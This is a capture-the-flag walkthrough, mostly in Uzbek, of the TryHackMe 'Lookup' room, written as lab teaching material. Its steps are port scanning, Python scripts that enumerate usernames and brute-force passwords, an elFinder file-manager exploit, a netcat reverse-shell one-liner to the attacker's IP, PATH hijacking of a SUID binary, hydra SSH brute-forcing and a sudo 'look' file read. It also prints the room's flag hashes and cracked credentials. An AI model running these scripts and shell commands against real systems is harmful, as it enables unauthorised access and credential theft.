### LookUp

Room Link: https://tryhackme.com/room/lookup

## Avvalo ishni doimgidek razvetkadan boshlaymiz

```
rustscan -a 10.10.119.11 -- -sV
```



Natija:

```
╭─mete   󰉖 ~
╰─ ❯❯ fish
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
mete@sec ~> rustscan -a 10.10.119.11 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.119.11:22
Open 10.10.119.11:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.119.11
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 00:03 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 00:03
Scanning 10.10.119.11 [2 ports]
Completed Ping Scan at 00:03, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:03
Completed Parallel DNS resolution of 1 host. at 00:03, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:03
Scanning 10.10.119.11 [2 ports]
Discovered open port 22/tcp on 10.10.119.11
Discovered open port 80/tcp on 10.10.119.11
Completed Connect Scan at 00:03, 0.12s elapsed (2 total ports)
Initiating Service scan at 00:03
Scanning 2 services on 10.10.119.11
Completed Service scan at 00:03, 6.25s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.119.11.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:03
Completed NSE at 00:03, 0.53s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:03
Completed NSE at 00:03, 0.47s elapsed
Nmap scan report for 10.10.119.11
Host is up, received syn-ack (0.12s latency).
Scanned at 2025-06-04 00:03:34 +05 for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

22 va 80 port ochiq. SSH va HTTP ishlamoqda...



80 portda **lookup.thm** domeni topildi buni hostnamelarga qo'shib olamiz.

```
sudo echo "10.10.119.11 lookup.thm" >> /etc/hosts
```



Routinglarni tekshirib ko'rdim

```
gobuster dir -u http://lookup.thm/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Natija:

```
mete@sec ~> gobuster dir -u http://lookup.thm/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220544 / 220545 (100.00%)
===============================================================
Finished
===============================================================
```



Lekin hech qanday routing topilmadi.



Biz saytda faqat login-page ni ko'rdik va SQL injection zaifligi bo'yicha testlab ko'rdik. Sahifa zaif emas ekan. Biroq biz shunchaki taxminiy login-parollarni sinab ko'rayotgan chog'imizda "Xatolik haqida ko'p ma'lumot berish" holatiga duch keldik. Yani Username va Passwordlar bo'yicha. Bu xato usernamelarni enumeratsiya qilshda qo'l keldi. Yani agar user mavjud bo'lmasa "Username or password is incorrect", mavjud bo'lsa "Password is incorrect".

## Brute-Force

Usernameni enumeratsiya qiluvchi script:

```]
import requests

url = "http://lookup.thm/login.php"

# username listni manzili
file_path = "/usr/share/payloads/seclists/Usernames/Names/names.txt"

try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # pass
            
            # Post so'rovni tayyorlash
            data = {
                "username": username,
                "password": "password"  # shunchaki parol
            }

            # Post so'rov yuborish
            response = requests.post(url, data=data)
            
            # Javobni tekshirish
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

Natija:

```
╭─mete   󰉖 ~/THM/THM-LABS/0406-2025                                                  
╰─ ❯❯ sudo python3 username_enum.py 
Username found: admin
Username found: jose
```





Endi parolni brute-force qilamiz.

Script:

```
import requests

url = "http://lookup.thm/login.php"

# username listni manzili
file_path = "/usr/share/payloads/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt"

username = "jose"

try:
    with open(file_path, "r") as file:
        for line in file:
            password = line.strip()
            
            # Post so'rovni tayyorlash
            data = {
                "username": username,
                "password": password  # shunchaki parol
            }

            # Post so'rov yuborish
            response = requests.post(url, data=data)
            
            # Javobni tekshirish
            if not (("Wrong password" in response.text) or ("wrong username" in response.text)):
                print(f"{username}:{password} -- Bingo!!!")
                break
            else:
                print(f"{username}:{password} -- Trying...")
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

Jarayonda:

```
Error: An HTTP request error occurred: HTTPConnectionPool(host='files.lookup.thm', port=80): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x7f104bf0ce20>: Failed to resolve 'files.lookup.thm' ([Errno -2] Name or service not known)"))
```

ro'yxatga olinmagan subdomen haqida xabarni ko'rdim va bu subdomenni ro'yxatdan o'tkizib qaytsa sinab ko'rdim.

```
echo "10.10.119.11 files.lookup.thm" >> /etc/hosts
```



Qaytadan urinib ko'raman.

```
jose:password123 -- Bingo!!!
```

Yomayo... parolni murakkabligini qarang...

Endi esa admin userini brute-force qilamiz va natija:

```
admin:password123 -- Bingo!!!
```



Josega endi login qilamiz... U bizni files.lookup.thm saytiga olib o'tdi

![](https://github.com/akhatkulov/Write-Ups/blob/main/TryHackme/Pictures/lookup_1.jpg?raw=true)

Panelning ko'rinishi shunday ekan va bu elFinder.

Keling uni versiyasini tekshirib, shu versiyada zaifliklar bor yoki yo'q ekanini ko'ramiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/lookup_2.jpg)

Panel haqida ma'lumot olish uchun ushbu tugmani bosing.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/lookup_3.jpg)

## Web exploit (hacking)

Versiya **elFinder 2.1.47** ekan

Exploitni google orqali qidirish:

```
site:exploit-db.com elFinder 2.1.47
```

Va topilgan exploit uchun manzil:
```
https://www.exploit-db.com/exploits/46481
```

Bu expoit python2da yozilgan ekan mening noutbukimda python2 mavjud bo'lmagani uchun python3ga konvertatsiya qilib oldim. (GPT orqali)



```
╭─mete   󰉖 ~/THM/THM-LABS/0406-2025
╰─ ❯❯ python3 elfinder_exploit-3.py http://files.lookup.thm/elFinder/
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ whoami
www-data

$ 
```



Eksplatatsiya muvaffaqiyatli bajarildi. Biz hozir www-data useridamiz... Bizning endi maqsadimiz imtiyozlarni oshirish)

## Privilage Escalation
Keling jarayonni osonroq bo'lishi uchun serverdan o'zimizga Reverse Shell ochamiz.

O'zimizga:
```
nc -lvnp 4445
```

Serverga:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.24.135 4445 > /tmp/f
```

TTY ochish:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



Bizga tizimni tahlil qilishda yordam beradigan dastur bu LinPeas.sh. 

Uni yuklab olish:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Kompyuterimizga yuklab olgach biz o'zimizdan HTTP server ochib faylni serverga olib o'tamiz.

Http server ochish:

```
sudo python3 -m http.server 80
```

Serverga yuklash:

```
wget 10.8.24.135/linpeas.sh
```

Unga Execution huquqini berish:

```
chmod +x linpeas.sh
```

Ishga tushurish:

```
./linpeas.sh -a > res.txt
```

Jarayon yakunlangach esa:

```
cat res.txt
```



Bizni qiziqtirgan bir report qismi:

```
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 129K May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1950/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1950/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K May 30  2023 /snap/core20/1950/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1950/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1950/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K May 30  2023 /snap/core20/1950/usr/bin/su
-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/1950/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K May 30  2023 /snap/core20/1950/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1974/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1974/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K May 30  2023 /snap/core20/1974/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1974/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1974/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K May 30  2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/1974/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K May 30  2023 /snap/core20/1974/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K Aug  4  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
  --- It looks like /usr/sbin/pwm is executing perror and you can impersonate it (strings line: perror) (https://tinyurl.com/suidpath)
  --- Checking for writable dependencies of /usr/sbin/pwm...
```

Linpeas bergan hisobotiga ko'ra biz **/usr/sbin/pwm** dasturi orqali eskalatsiya qila olamiz.

Keling shunchaki dasturni ishga tushurib ko'ramiz.

```
$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

Fayl tahlillariga ko'ra biz **path hijacking** qila olamiz. 
Let's do it!

```
echo $PATH
```

```
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
```

```
chmod 777 /tmp/id
```

```
export PATH=/tmp:$PATH
```

```
echo $PATH
```

```
/usr/sbin/pwm
```



Dastur bizga **think** deb nomlangan  foydalanuvchini parollar ro'yxatini berdi. Endi **hydra** dasturi orqali Brute-Force qilib topamiz.

```
hydra -l think -P think_wordlist ssh://10.10.102.35
```

Natija:

```
╭─mete   󰉖 ~/THM/THM-LABS/0406-2025  
╰─ ❯❯ hydra -l think -P think_wordlist ssh://10.10.102.35
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:10:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.10.102.35:22/
[22][ssh] host: 10.10.102.35   login: think   password: josemario.AKA(think)
```

Parol: josemario.AKA(think)



SSH orqali ulanamiz.

```
ssh think@lookup.thm
```

Natija:

```
think@ip-10-10-102-35:~$ ls
user.txt
think@ip-10-10-102-35:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e
```



Endi ROOT huquqini olamiz?

Bizga /root/root.txt matinini o'qish kerak.

Hozir think foydalanuvchini imkoniyatlarini **sudo -l** buyrug'i orqali tekshirib ko'ramiz.

Natija:

```
think@ip-10-10-102-35:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on ip-10-10-102-35:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-102-35:
    (ALL) /usr/bin/look
```



GTFobinsda bundan qanday foydalanish o'rgatilgan ekan.

Link: https://gtfobins.github.io/gtfobins/look/#sudo



Qo'llash:

```
LFILE=/root/root.txt
sudo look '' "$LFILE"
```

Natija:

```
5a285a9f257e45c68bb6c9f9f57d18e8
```



### Nafas olar ekanman, men yana davom etaman... 
